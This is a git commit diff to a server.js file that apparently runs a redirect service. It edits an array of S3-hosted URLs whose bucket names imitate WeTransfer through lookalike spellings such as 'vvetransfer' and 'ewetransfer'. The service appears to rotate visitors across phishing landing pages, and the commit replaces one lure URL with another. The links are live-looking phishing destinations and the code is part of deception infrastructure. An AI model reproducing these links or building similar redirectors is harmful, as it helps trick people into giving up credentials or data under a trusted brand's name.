dd71dbe9cfedba9f29f1eae392c3df52465f309e
root005billy <gilliard.pinheiro@tenqualuz.pt>
2025-03-24 17:47:08 +0100

    Update server.js

--- server.js
+++ server.js
@@ -7,7 +7,7 @@ const PORT = process.env.PORT || 3000; // Render assigns a PORT dynamically
 const urls = [
     "https://s3.us-east-1.amazonaws.com/vvetransfer.com-explore-data-security-1/Downloads67e1401a94caa9a9664aebe0.html",
     "https://s3.us-east-1.amazonaws.com/etransfer.com-explore-file-sharing/data-secureda9a9664aebe067e1401a94ca.html",
-    "https://s3.us-east-1.amazonaws.com/vvetransfer.com-explore-data-security-1/Downloads67e1401a94caa9a9664aebe0.html"
+    "https://s3.us-east-1.amazonaws.com/ewetransfer.com-explore-advertising-policies/transfer-secureda9a9664aebe067e1401a94ca.html"
 ];
 
 // Route to handle redirection
